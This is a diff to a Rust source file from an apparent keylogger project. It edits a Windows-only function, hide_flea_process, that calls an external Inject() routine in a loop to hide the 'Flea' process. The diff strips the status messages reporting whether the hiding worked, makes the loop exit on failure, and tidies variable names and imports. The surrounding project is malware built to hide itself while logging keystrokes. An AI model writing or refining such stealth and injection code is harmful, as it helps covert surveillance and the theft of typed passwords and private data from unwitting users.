@@ -1,12 +1,11 @@
 use std::sync::{Arc, Mutex};
-
 use crate::keylogger::Keylogger;
 
 #[cfg(target_os = "windows")]
 pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
 {
     use core::time;
-    use std::{thread};
+    use std::thread;
     use crate::systemcmd::SystemCmd;
 
     extern {
@@ -33,12 +32,11 @@ pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
                 unsafe { ret_val = Inject(); }
                 if ret_val == 0
                 {
-                    println!("Flea process hidden");
                     hidden = true;
                 }
                 else
                 {
-                    println!("Flea process not hidden");
+                    break;
                 }
             }
         }
@@ -55,8 +53,8 @@ pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
 
         drop(val);
 
-        let ten_millis = time::Duration::from_millis(WAIT_THREE_SECONDS);
-        thread::sleep(ten_millis);
+        let millis = time::Duration::from_millis(WAIT_THREE_SECONDS);
+        thread::sleep(millis);
     }
 }
 
